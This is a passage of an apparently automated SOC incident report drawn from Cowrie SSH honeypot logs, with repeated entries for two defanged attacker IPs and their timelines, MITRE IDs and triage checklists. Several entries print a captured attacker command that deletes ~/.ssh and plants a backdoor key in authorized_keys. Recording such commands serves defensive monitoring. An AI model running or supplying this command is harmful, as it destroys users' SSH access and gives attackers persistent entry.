| `2026-04-24 21:42:15` | `cowrie.session.connect` |
| `2026-04-24 21:42:15` | `cowrie.client.version` |
| `2026-04-24 21:42:16` | `cowrie.client.kex` |
| `2026-04-24 21:42:16` | `cowrie.login.success` |
| `2026-04-24 21:42:17` | `cowrie.session.params` |
| `2026-04-24 21:42:17` | `cowrie.command.input` |
| `2026-04-24 21:42:17` | `cowrie.command.failed` |
| `2026-04-24 21:42:17` | `cowrie.log.closed` |
| `2026-04-24 21:42:17` | `cowrie.session.params` |
| `2026-04-24 21:42:17` | `cowrie.command.input` |
| `2026-04-24 21:42:17` | `cowrie.session.file_download` |
| `2026-04-24 21:42:17` | `cowrie.log.closed` |
| `2026-04-24 21:42:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.58.136[.]133` to AbuseIPDB if not already reported
- [ ] Block `37.58.136[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdd295e93fb2

| Field | Detail |
|---|---|
| **Source IP** | `37.58.136[.]133` |
| **First Seen** | 2026-04-24 21:42 |
| **Last Seen** | 2026-04-24 21:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:42:20` | `cowrie.session.connect` |
| `2026-04-24 21:42:20` | `cowrie.client.version` |
| `2026-04-24 21:42:20` | `cowrie.client.kex` |
| `2026-04-24 21:42:20` | `cowrie.login.success` |
| `2026-04-24 21:42:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.58.136[.]133` to AbuseIPDB if not already reported
- [ ] Block `37.58.136[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc80b486c38f

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-04-24 21:42 |
| **Last Seen** | 2026-04-24 21:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:42:28` | `cowrie.session.connect` |
| `2026-04-24 21:42:28` | `cowrie.client.version` |
| `2026-04-24 21:42:29` | `cowrie.client.kex` |
| `2026-04-24 21:42:30` | `cowrie.login.success` |
| `2026-04-24 21:42:30` | `cowrie.session.params` |
| `2026-04-24 21:42:30` | `cowrie.command.input` |
| `2026-04-24 21:42:30` | `cowrie.command.failed` |
| `2026-04-24 21:42:31` | `cowrie.log.closed` |
| `2026-04-24 21:42:31` | `cowrie.session.params` |
| `2026-04-24 21:42:31` | `cowrie.command.input` |
| `2026-04-24 21:42:32` | `cowrie.session.file_download` |
| `2026-04-24 21:42:32` | `cowrie.log.closed` |
| `2026-04-24 21:42:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0faf2bd3a66

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-04-24 21:42 |
| **Last Seen** | 2026-04-24 21:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:42:35` | `cowrie.session.connect` |
| `2026-04-24 21:42:35` | `cowrie.client.version` |
| `2026-04-24 21:42:35` | `cowrie.client.kex` |
| `2026-04-24 21:42:37` | `cowrie.login.success` |
| `2026-04-24 21:42:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1e5acca19ab

| Field | Detail |
|---|---|
| **Source IP** | `37.58.136[.]133` |
| **First Seen** | 2026-04-24 21:43 |
| **Last Seen** | 2026-04-24 21:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:43:01` | `cowrie.session.connect` |
| `2026-04-24 21:43:01` | `cowrie.client.version` |
| `2026-04-24 21:43:02` | `cowrie.client.kex` |
| `2026-04-24 21:43:02` | `cowrie.login.success` |
| `2026-04-24 21:43:03` | `cowrie.session.params` |
| `2026-04-24 21:43:03` | `cowrie.command.input` |
| `2026-04-24 21:43:03` | `cowrie.command.failed` |
| `2026-04-24 21:43:03` | `cowrie.log.closed` |
| `2026-04-24 21:43:03` | `cowrie.session.params` |
| `2026-04-24 21:43:03` | `cowrie.command.input` |
| `2026-04-24 21:43:03` | `cowrie.session.file_download` |
| `2026-04-24 21:43:03` | `cowrie.log.closed` |
| `2026-04-24 21:43:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.58.136[.]133` to AbuseIPDB if not already reported
- [ ] Block `37.58.136[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-034eb127b883

| Field | Detail |
|---|---|
| **Source IP** | `37.58.136[.]133` |
| **First Seen** | 2026-04-24 21:43 |
| **Last Seen** | 2026-04-24 21:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:43:06` | `cowrie.session.connect` |
| `2026-04-24 21:43:06` | `cowrie.client.version` |
| `2026-04-24 21:43:06` | `cowrie.client.kex` |
| `2026-04-24 21:43:06` | `cowrie.login.success` |
| `2026-04-24 21:43:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.58.136[.]133` to AbuseIPDB if not already reported
- [ ] Block `37.58.136[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92147fdbe4c0

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-04-24 21:43 |
| **Last Seen** | 2026-04-24 21:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:43:17` | `cowrie.session.connect` |
| `2026-04-24 21:43:17` | `cowrie.client.version` |
| `2026-04-24 21:43:17` | `cowrie.client.kex` |
| `2026-04-24 21:43:19` | `cowrie.login.success` |
| `2026-04-24 21:43:19` | `cowrie.session.params` |
| `2026-04-24 21:43:19` | `cowrie.command.input` |
| `2026-04-24 21:43:19` | `cowrie.command.failed` |
| `2026-04-24 21:43:20` | `cowrie.log.closed` |
| `2026-04-24 21:43:20` | `cowrie.session.params` |
| `2026-04-24 21:43:20` | `cowrie.command.input` |
| `2026-04-24 21:43:20` | `cowrie.session.file_download` |
| `2026-04-24 21:43:20` | `cowrie.log.closed` |
| `2026-04-24 21:43:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e72a00384413

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-04-24 21:43 |
| **Last Seen** | 2026-04-24 21:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:43:24` | `cowrie.session.connect` |
| `2026-04-24 21:43:24` | `cowrie.client.version` |
| `2026-04-24 21:43:24` | `cowrie.client.kex` |
| `2026-04-24 21:43:25` | `cowrie.login.success` |
| `2026-04-24 21:43:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94407369ff81

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-04-24 21:45 |
| **Last Seen** | 2026-04-24 21:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:45:37` | `cowrie.session.connect` |
| `2026-04-24 21:45:37` | `cowrie.client.version` |
| `2026-04-24 21:45:37` | `cowrie.client.kex` |
| `2026-04-24 21:45:38` | `cowrie.login.success` |
| `2026-04-24 21:45:39` | `cowrie.session.params` |
| `2026-04-24 21:45:39` | `cowrie.command.input` |
| `2026-04-24 21:45:39` | `cowrie.command.failed` |
| `2026-04-24 21:45:39` | `cowrie.log.closed` |
| `2026-04-24 21:45:40` | `cowrie.session.params` |
| `2026-04-24 21:45:40` | `cowrie.command.input` |
| `2026-04-24 21:45:40` | `cowrie.session.file_download` |
| `2026-04-24 21:45:40` | `cowrie.log.closed` |
| `2026-04-24 21:45:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-329f6562c4b6

| Field | Detail |
|---|---|
| **Source IP** | `37.58.136[.]133` |
| **First Seen** | 2026-04-24 21:45 |
| **Last Seen** | 2026-04-24 21:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:45:37` | `cowrie.session.connect` |
| `2026-04-24 21:45:37` | `cowrie.client.version` |
| `2026-04-24 21:45:37` | `cowrie.client.kex` |
| `2026-04-24 21:45:38` | `cowrie.login.success` |
| `2026-04-24 21:45:38` | `cowrie.session.params` |
| `2026-04-24 21:45:38` | `cowrie.command.input` |
| `2026-04-24 21:45:38` | `cowrie.command.failed` |
| `2026-04-24 21:45:39` | `cowrie.log.closed` |
| `2026-04-24 21:45:39` | `cowrie.session.params` |
| `2026-04-24 21:45:39` | `cowrie.command.input` |
| `2026-04-24 21:45:39` | `cowrie.session.file_download` |
| `2026-04-24 21:45:39` | `cowrie.log.closed` |
| `2026-04-24 21:45:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.58.136[.]133` to AbuseIPDB if not already reported
- [ ] Block `37.58.136[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92dd42c575ae

| Field | Detail |
|---|---|
| **Source IP** | `37.58.136[.]133` |
| **First Seen** | 2026-04-24 21:45 |
| **Last Seen** | 2026-04-24 21:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:45:41` | `cowrie.session.connect` |
| `2026-04-24 21:45:41` | `cowrie.client.version` |
| `2026-04-24 21:45:42` | `cowrie.client.kex` |
| `2026-04-24 21:45:42` | `cowrie.login.success` |
| `2026-04-24 21:45:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.58.136[.]133` to AbuseIPDB if not already reported
- [ ] Block `37.58.136[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36eb00898b84

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-04-24 21:45 |
| **Last Seen** | 2026-04-24 21:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:45:43` | `cowrie.session.connect` |
| `2026-04-24 21:45:43` | `cowrie.client.version` |
| `2026-04-24 21:45:43` | `cowrie.client.kex` |
| `2026-04-24 21:45:45` | `cowrie.login.success` |
| `2026-04-24 21:45:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fae176ea363

| Field | Detail |
|---|---|
| **Source IP** | `37.58.136[.]133` |
| **First Seen** | 2026-04-24 21:45 |
| **Last Seen** | 2026-04-24 21:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:45:50` | `cowrie.session.connect` |
| `2026-04-24 21:45:50` | `cowrie.client.version` |
| `2026-04-24 21:45:50` | `cowrie.client.kex` |
| `2026-04-24 21:45:51` | `cowrie.login.success` |
| `2026-04-24 21:45:51` | `cowrie.session.params` |
| `2026-04-24 21:45:51` | `cowrie.command.input` |
| `2026-04-24 21:45:51` | `cowrie.command.failed` |
| `2026-04-24 21:45:51` | `cowrie.log.closed` |
| `2026-04-24 21:45:52` | `cowrie.session.params` |
| `2026-04-24 21:45:52` | `cowrie.command.input` |
| `2026-04-24 21:45:52` | `cowrie.session.file_download` |
| `2026-04-24 21:45:52` | `cowrie.log.closed` |
| `2026-04-24 21:45:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.58.136[.]133` to AbuseIPDB if not already reported
- [ ] Block `37.58.136[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08115e4a70e3

| Field | Detail |
|---|---|
| **Source IP** | `37.58.136[.]133` |
| **First Seen** | 2026-04-24 21:45 |
| **Last Seen** | 2026-04-24 21:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:45:54` | `cowrie.session.connect` |
| `2026-04-24 21:45:54` | `cowrie.client.version` |
| `2026-04-24 21:45:54` | `cowrie.client.kex` |
| `2026-04-24 21:45:55` | `cowrie.login.success` |
| `2026-04-24 21:45:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.58.136[.]133` to AbuseIPDB if not already reported
- [ ] Block `37.58.136[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a0b2648543e

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-04-24 21:46 |
| **Last Seen** | 2026-04-24 21:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:46:22` | `cowrie.session.connect` |
| `2026-04-24 21:46:22` | `cowrie.client.version` |
| `2026-04-24 21:46:22` | `cowrie.client.kex` |
| `2026-04-24 21:46:23` | `cowrie.login.success` |
| `2026-04-24 21:46:24` | `cowrie.session.params` |
| `2026-04-24 21:46:24` | `cowrie.command.input` |
| `2026-04-24 21:46:24` | `cowrie.command.failed` |
| `2026-04-24 21:46:24` | `cowrie.log.closed` |
| `2026-04-24 21:46:24` | `cowrie.session.params` |
| `2026-04-24 21:46:24` | `cowrie.command.input` |
| `2026-04-24 21:46:25` | `cowrie.session.file_download` |
| `2026-04-24 21:46:25` | `cowrie.log.closed` |
| `2026-04-24 21:46:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fcdda7ab5d2

| Field | Detail |
|---|---|
| **Source IP** | `148.216.28[.]11` |
| **First Seen** | 2026-04-24 21:46 |
| **Last Seen** | 2026-04-24 21:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:46:28` | `cowrie.session.connect` |
| `2026-04-24 21:46:28` | `cowrie.client.version` |
| `2026-04-24 21:46:28` | `cowrie.client.kex` |
| `2026-04-24 21:46:29` | `cowrie.login.success` |
| `2026-04-24 21:46:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `148.216.28[.]11` to AbuseIPDB if not already reported
- [ ] Block `148.216.28[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0946277ba5e

| Field | Detail |
|---|---|
| **Source IP** | `37.58.136[.]133` |
| **First Seen** | 2026-04-24 21:47 |
| **Last Seen** | 2026-04-24 21:47 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:47:26` | `cowrie.session.connect` |
| `2026-04-24 21:47:26` | `cowrie.client.version` |
| `2026-04-24 21:47:26` | `cowrie.client.kex` |
| `2026-04-24 21:47:27` | `cowrie.login.success` |
| `2026-04-24 21:47:27` | `cowrie.session.params` |
| `2026-04-24 21:47:27` | `cowrie.command.input` |
| `2026-04-24 21:47:27` | `cowrie.command.failed` |
| `2026-04-24 21:47:27` | `cowrie.log.closed` |
| `2026-04-24 21:47:28` | `cowrie.session.params` |
| `2026-04-24 21:47:28` | `cowrie.command.input` |
| `2026-04-24 21:47:28` | `cowrie.session.file_download` |
| `2026-04-24 21:47:28` | `cowrie.log.closed` |
| `2026-04-24 21:47:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.58.136[.]133` to AbuseIPDB if not already reported
- [ ] Block `37.58.136[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad9f18f41416

| Field | Detail |
|---|---|
| **Source IP** | `37.58.136[.]133` |
| **First Seen** | 2026-04-24 21:47 |
| **Last Seen** | 2026-04-24 21:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 21:47:30` | `cowrie.session.connect` |
| `2026-04-24 21:47:30` | `cowrie.client.version` |
| `2026-04-24 21:47:30` | `cowrie.client.kex` |
